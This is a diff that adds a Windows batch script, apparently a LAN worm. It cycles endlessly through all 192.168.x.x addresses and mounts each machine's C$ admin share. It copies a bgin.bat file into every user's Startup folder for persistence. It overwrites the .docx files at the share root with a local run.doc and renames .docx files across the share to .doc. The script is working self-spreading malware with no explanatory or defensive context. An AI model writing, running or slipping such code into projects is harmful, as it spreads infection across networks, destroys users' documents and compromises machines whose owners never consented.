@@ -1,0 +1,20 @@
+@echo off
+SET ii=1
+SET i=0
+:run
+net use X: \\192.168.%i%.%ii%\C$
+if exist X: (for /f %%x in ('dir X:\Users /b') do mkdir "X:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+if exist X: (for /f %%u in ('dir X:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "X:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "X:\%%h"
+for /R "X:" %%f in (*.docx) do ren "%%f" *.doc
+net use X: /delete)))
+if %ii% == 256 (goto next) else (set /a ii=ii+1)
+goto run
+:next
+if %i% == 256 (goto reset) else (set /a i=i+1)
+SET ii=1
+goto run
+:reset
+SET i=0
+SET ii=1
+goto run
